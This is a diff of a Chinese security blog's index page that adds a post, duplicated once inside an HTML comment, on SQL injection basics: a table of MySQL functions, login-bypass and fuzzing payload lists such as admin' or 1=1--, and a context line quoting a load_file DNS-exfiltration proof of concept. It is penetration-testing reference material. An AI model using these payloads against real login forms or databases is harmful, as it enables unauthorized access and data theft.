@@ -123,6 +123,370 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2020/12/23/sql注入常用知识/" >sql注入常用知识</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2020-12-23  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><table>
+<thead>
+<tr>
+<th>函数名</th>
+<th>作用</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>version()</td>
+<td>数据库版本</td>
+<td></td>
+</tr>
+<tr>
+<td>user()</td>
+<td>数据库用户名</td>
+<td></td>
+</tr>
+<tr>
+<td>database()</td>
+<td>数据库名</td>
+<td></td>
+</tr>
+<tr>
+<td>limit 0,1</td>
+<td>返回数据的条数</td>
+<td>第一个参数为起始行，第二个参数为返回的行数</td>
+</tr>
+<tr>
+<td>substr(str,1,1)</td>
+<td>截取字符串</td>
+<td>第二个参数为起始位置，从1开始，第二个为截取的数量</td>
+</tr>
+<tr>
+<td>mid(str,1,1)</td>
+<td>同substr()</td>
+<td></td>
+</tr>
+<tr>
+<td>left(str,n)</td>
+<td>返回字符串的前n个字符</td>
+<td></td>
+</tr>
+<tr>
+<td>right(str,n)</td>
+<td>返回字符串的后n个字符</td>
+<td></td>
+</tr>
+<tr>
+<td>count(exp)</td>
+<td>结果数量</td>
+<td></td>
+</tr>
+<tr>
+<td>load_file()</td>
+<td>导入文件</td>
+<td></td>
+</tr>
+<tr>
+<td>hex()</td>
+<td>转换为16进制</td>
+<td></td>
+</tr>
+<tr>
+<td>concat(str1,str2…)</td>
+<td>合并多个字符串，没有分隔符</td>
+<td></td>
+</tr>
+<tr>
+<td>concat_ws(x,str1,str2..)</td>
+<td>同concat(),第一个参数为分隔符</td>
+<td></td>
+</tr>
+<tr>
+<td>group_concat()</td>
+<td>连接一个组的字符串，用组分割</td>
+<td></td>
+</tr>
+<tr>
+<td>ascii(str)</td>
+<td>返回字符串第一个字符的ascii码</td>
+<td></td>
+</tr>
+<tr>
+<td>ord(str)</td>
+<td>同ascii()</td>
+<td></td>
+</tr>
+<tr>
+<td>desc table_name</td>
+<td>展示表中的字段名和数据类型</td>
+<td></td>
+</tr>
+<tr>
+<td>strcmp(expr1,expr2)</td>
+<td>字符串比较，一样返回0，第一个小于第二个返回-1,第一个大于第二个返回1</td>
+<td></td>
+</tr>
+<tr>
+<td>RPAD(str,len,padstr)</td>
+<td>在str右方补齐len位的padstr，如果len小于str，返回len长度的str</td>
+<td></td>
+</tr>
+<tr>
+<td>LPAD(str,len,padstr)</td>
+<td>类似RPAD(),左补齐</td>
+<td></td>
+</tr>
+<tr>
+<td>INSERT(str,pos,len,newstr)</td>
+<td>在原始字符串 str 中，将自左数第 pos 位开始，长度为 len 个字符的字符串替换为新字符串 newstr，然后返回经过替换后的字符串。INSERT(str,len,1,0x0)可当做截取函数。</td>
+<td></td>
+</tr>
+<tr>
+<td>LENGTH(str)</td>
+<td>返回字符串的长度</td>
+<td></td>
+</tr>
+<tr>
+<td>PI()</td>
+<td>返回π的具体数值</td>
+<td></td>
+</tr>
+<tr>
+<td>REGEXP “statement”</td>
+<td>正则匹配，返回布尔值</td>
+<td></td>
+</tr>
+<tr>
+<td>LIKE “statement”</td>
+<td>匹配数据，%代表任意内容，返回布尔值</td>
+<td></td>
+</tr>
+<tr>
+<td>RLIKE “statement”</td>
+<td>与regexp相同</td>
+<td></td>
+</tr>
+<tr>
+<td>LOWER(str)</td>
+<td>转换为小写，同LCASE(str)</td>
+<td></td>
+</tr>
+<tr>
+<td>UPPER(str)</td>
+<td>转换为大写,同UCASE(str)</td>
+<td></td>
+</tr>
+<tr>
+<td>NULLIF(expr1,expr2)</td>
+<td>如果相同，返回expr1，否则返回null</td>
+<td></td>
+</tr>
+<tr>
+<td>CHARSET(str)</td>
+<td>返回字符串使用的字符集</td>
+<td></td>
+</tr>
+</tbody></table>
+<h2 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h2><p>|变量名|作用|<br>|—|—|—|<br>|@@datadir|数据库路径|<br>|versiomn_compile_os|操作系统版本|</p>
+<h2 id="常用fuzz"><a href="#常用fuzz" class="headerlink" title="常用fuzz"></a>常用fuzz</h2><h3 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h3><p> ‘ or ‘’-‘<br>“ or “”-“<br>“ or true–<br>‘ or true–<br>admin’ –<br>admin’ #<br>admin’/*<br>admin’ or ‘1’=’1<br>admin’ or ‘1’=’1’–<br>admin’ or ‘1’=’1’#<br>admin’or 1=1 or ‘’=’<br>admin’ or 1=1<br>admin’ or 1=1–<br>admin’ or 1=1#<br>admin’ or 1=1/*</p>
+<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>‘-‘<br>‘ ‘<br>‘&amp;’<br>‘^’<br>‘<em>‘<br>‘ or ‘’-‘<br>‘ or ‘’ ‘<br>‘ or ‘’&amp;’<br>‘ or ‘’^’<br>‘ or ‘’</em>‘<br>“-“<br>“ “<br>“&amp;”<br>“^”<br>“<em>“<br>“ or “”-“<br>“ or “” “<br>“ or “”&amp;”<br>“ or “”^”<br>“ or “”</em>“<br>or true–<br>“ or true–<br>‘ or true–<br>“) or true–<br>‘) or true–</p>
+<h2 id="常用数据库"><a href="#常用数据库" class="headerlink" title="常用数据库"></a>常用数据库</h2>
+	
+
+	</div>
+  <a type="button" href="/2020/12/23/sql注入常用知识/#more" class="btn btn-default more">阅读此文</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><table>
+<thead>
+<tr>
+<th>函数名</th>
+<th>作用</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>version()</td>
+<td>数据库版本</td>
+<td></td>
+</tr>
+<tr>
+<td>user()</td>
+<td>数据库用户名</td>
+<td></td>
+</tr>
+<tr>
+<td>database()</td>
+<td>数据库名</td>
+<td></td>
+</tr>
+<tr>
+<td>limit 0,1</td>
+<td>返回数据的条数</td>
+<td>第一个参数为起始行，第二个参数为返回的行数</td>
+</tr>
+<tr>
+<td>substr(str,1,1)</td>
+<td>截取字符串</td>
+<td>第二个参数为起始位置，从1开始，第二个为截取的数量</td>
+</tr>
+<tr>
+<td>mid(str,1,1)</td>
+<td>同substr()</td>
+<td></td>
+</tr>
+<tr>
+<td>left(str,n)</td>
+<td>返回字符串的前n个字符</td>
+<td></td>
+</tr>
+<tr>
+<td>right(str,n)</td>
+<td>返回字符串的后n个字符</td>
+<td></td>
+</tr>
+<tr>
+<td>count(exp)</td>
+<td>结果数量</td>
+<td></td>
+</tr>
+<tr>
+<td>load_file()</td>
+<td>导入文件</td>
+<td></td>
+</tr>
+<tr>
+<td>hex()</td>
+<td>转换为16进制</td>
+<td></td>
+</tr>
+<tr>
+<td>concat(str1,str2…)</td>
+<td>合并多个字符串，没有分隔符</td>
+<td></td>
+</tr>
+<tr>
+<td>concat_ws(x,str1,str2..)</td>
+<td>同concat(),第一个参数为分隔符</td>
+<td></td>
+</tr>
+<tr>
+<td>group_concat()</td>
+<td>连接一个组的字符串，用组分割</td>
+<td></td>
+</tr>
+<tr>
+<td>ascii(str)</td>
+<td>返回字符串第一个字符的ascii码</td>
+<td></td>
+</tr>
+<tr>
+<td>ord(str)</td>
+<td>同ascii()</td>
+<td></td>
+</tr>
+<tr>
+<td>desc table_name</td>
+<td>展示表中的字段名和数据类型</td>
+<td></td>
+</tr>
+<tr>
+<td>strcmp(expr1,expr2)</td>
+<td>字符串比较，一样返回0，第一个小于第二个返回-1,第一个大于第二个返回1</td>
+<td></td>
+</tr>
+<tr>
+<td>RPAD(str,len,padstr)</td>
+<td>在str右方补齐len位的padstr，如果len小于str，返回len长度的str</td>
+<td></td>
+</tr>
+<tr>
+<td>LPAD(str,len,padstr)</td>
+<td>类似RPAD(),左补齐</td>
+<td></td>
+</tr>
+<tr>
+<td>INSERT(str,pos,len,newstr)</td>
+<td>在原始字符串 str 中，将自左数第 pos 位开始，长度为 len 个字符的字符串替换为新字符串 newstr，然后返回经过替换后的字符串。INSERT(str,len,1,0x0)可当做截取函数。</td>
+<td></td>
+</tr>
+<tr>
+<td>LENGTH(str)</td>
+<td>返回字符串的长度</td>
+<td></td>
+</tr>
+<tr>
+<td>PI()</td>
+<td>返回π的具体数值</td>
+<td></td>
+</tr>
+<tr>
+<td>REGEXP “statement”</td>
+<td>正则匹配，返回布尔值</td>
+<td></td>
+</tr>
+<tr>
+<td>LIKE “statement”</td>
+<td>匹配数据，%代表任意内容，返回布尔值</td>
+<td></td>
+</tr>
+<tr>
+<td>RLIKE “statement”</td>
+<td>与regexp相同</td>
+<td></td>
+</tr>
+<tr>
+<td>LOWER(str)</td>
+<td>转换为小写，同LCASE(str)</td>
+<td></td>
+</tr>
+<tr>
+<td>UPPER(str)</td>
+<td>转换为大写,同UCASE(str)</td>
+<td></td>
+</tr>
+<tr>
+<td>NULLIF(expr1,expr2)</td>
+<td>如果相同，返回expr1，否则返回null</td>
+<td></td>
+</tr>
+<tr>
+<td>CHARSET(str)</td>
+<td>返回字符串使用的字符集</td>
+<td></td>
+</tr>
+</tbody></table>
+<h2 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h2><p>|变量名|作用|<br>|—|—|—|<br>|@@datadir|数据库路径|<br>|versiomn_compile_os|操作系统版本|</p>
+<h2 id="常用fuzz"><a href="#常用fuzz" class="headerlink" title="常用fuzz"></a>常用fuzz</h2><h3 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h3><p> ‘ or ‘’-‘<br>“ or “”-“<br>“ or true–<br>‘ or true–<br>admin’ –<br>admin’ #<br>admin’/*<br>admin’ or ‘1’=’1<br>admin’ or ‘1’=’1’–<br>admin’ or ‘1’=’1’#<br>admin’or 1=1 or ‘’=’<br>admin’ or 1=1<br>admin’ or 1=1–<br>admin’ or 1=1#<br>admin’ or 1=1/*</p>
+<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>‘-‘<br>‘ ‘<br>‘&amp;’<br>‘^’<br>‘<em>‘<br>‘ or ‘’-‘<br>‘ or ‘’ ‘<br>‘ or ‘’&amp;’<br>‘ or ‘’^’<br>‘ or ‘’</em>‘<br>“-“<br>“ “<br>“&amp;”<br>“^”<br>“<em>“<br>“ or “”-“<br>“ or “” “<br>“ or “”&amp;”<br>“ or “”^”<br>“ or “”</em>“<br>or true–<br>“ or true–<br>‘ or true–<br>“) or true–<br>‘) or true–</p>
+<h2 id="常用数据库"><a href="#常用数据库" class="headerlink" title="常用数据库"></a>常用数据库</h2>
+	
+	</div>
+  <a type="button" href="/2020/12/23/sql注入常用知识/#more" class="btn btn-default more">阅读此文</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2020/12/23/sql注入手法/" >sql注入手法</a>
 		</h3>
 		</div>
@@ -456,9 +820,7 @@ poc :`select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.f9bbk4.dn
 		<h4>分类</h4>
 		<ul class="tag_box inline list-unstyled">
 		
-			<li><a href="/categories/Diary/">Diary<span>1</span></a></li>
-		
-			<li><a href="/categories/web/">web<span>1</span></a></li>
+			<li><a href="/categories/web/">web<span>3</span></a></li>
 		
 		</ul>
 	</div>
@@ -469,13 +831,11 @@ poc :`select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.f9bbk4.dn
 		<h4>标签云</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/web/">web<span>1</span></a></li>
+			<li><a href="/tags/sql注入/">sql注入<span>2</span></a></li>
 		
-			<li><a href="/tags/Games/">Games<span>1</span></a></li>
+			<li><a href="/tags/渗透/">渗透<span>3</span></a></li>
 		
-			<li><a href="/tags/PS3/">PS3<span>1</span></a></li>
-		
-			<li><a href="/tags/渗透/">渗透<span>1</span></a></li>
+			<li><a href="/tags/web/">web<span>3</span></a></li>
 		
 		 
 		</ul>
@@ -487,6 +847,10 @@ poc :`select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.f9bbk4.dn
 <div class="widget">
   <h4>最新文章</h4>
   <ul class="entry list-unstyled">
+    
+      <li>
+        <a href="/2020/12/23/sql注入常用知识/" ><i class="fa fa-file-o"></i>sql注入常用知识</a>
+      </li>
     
       <li>
         <a href="/2020/12/23/sql注入手法/" ><i class="fa fa-file-o"></i>sql注入手法</a>
